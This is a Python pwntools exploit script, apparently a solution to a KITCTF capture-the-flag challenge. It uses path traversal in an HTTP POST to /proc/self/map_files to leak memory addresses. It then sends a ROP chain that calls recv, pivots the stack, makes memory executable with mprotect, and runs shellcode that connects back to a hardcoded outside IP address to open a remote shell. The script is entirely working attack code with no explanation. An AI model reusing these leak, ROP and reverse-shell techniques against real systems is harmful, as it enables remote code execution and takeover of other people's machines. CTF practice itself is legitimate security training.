from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("baby-ROP-but-unexploitable-0.chals.kitctf.de",1337,ssl=True)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def req_post(payload,leak=1):
    pay = b''
    if leak:
        pay+= b"POST ../../../../../proc/self/map_files "
    else:
        pay+= b"POST Z "
    pay+= b"0x132\r\n"# version
    pay+= b"\r\n\r\n"
    pay+= payload
    p.send(pay.ljust(4095,b'\0'))
payload = b''
req_post(payload)
for x in range(3):
    ru(b' href="')
pie = int(ru(b"-")[:-1],16)
log.warning(hex(pie))
for x in range(5):
    ru(b' href="')
base = int(ru(b"-")[:-1],16)
log.warning(hex(base))
p.interactive()
# p = remote("0.0.0.0",1337)
p = remote("baby-ROP-but-unexploitable-0.chals.kitctf.de",1337,ssl=True)
libc = ELF("./libc.so.6")
libc.address=base
rop = ROP(libc)
# gdb.attach(p,'')
rax     = rop.find_gadget(['pop rax','ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
rsi     = rop.find_gadget(['pop rsi','ret'])[0]
rdi     = rop.find_gadget(['pop rdi','ret'])[0]
rcx     = rop.find_gadget(['pop rcx','ret'])[0]
rbp     = rop.find_gadget(['pop rbp','ret'])[0]
leave   = rop.find_gadget(['leave','ret'])[0]
syscall = rop.find_gadget(['syscall','ret'])[0]
frecv   = 0x127800+base 
rdx     = 0x000000000011f497+base# pop rdx, pop r12
target = 0x228000+base

payload = flat([ret,rdi,4,rsi,target-0x400,rdx,0x400,0,rcx,0,frecv,
                rbp, target-0x400-8,leave])
req_post(payload,0)
ru(b'ectory\n')
input()
rop2 = flat([ rax,10,rdi,target-0x1000,rsi,0x1000,rdx,7,0,syscall,
                target-0x200
])
sh = shellcraft.connect("118.195.211.133",3389)+shellcraft.dupsh()
p.send(rop2.ljust(0x200,b'\0')+asm(sh).ljust(0x200,b'\0'))
p.interactive()